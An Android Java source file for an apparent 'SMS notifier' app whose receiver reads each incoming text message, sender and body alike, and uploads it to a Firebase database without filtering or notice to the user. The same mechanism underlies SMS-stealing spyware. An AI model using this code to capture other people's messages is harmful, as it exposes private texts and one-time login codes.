package com.example.smsnotifier;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String message = "From: " + sms.getOriginatingAddress() + "\nMessage: " + sms.getMessageBody();

                    // Send to Firebase
                    DatabaseReference ref = FirebaseDatabase.getInstance().getReference("notifications");
                    ref.push().setValue(message);
                }
            }
        }
    }
}
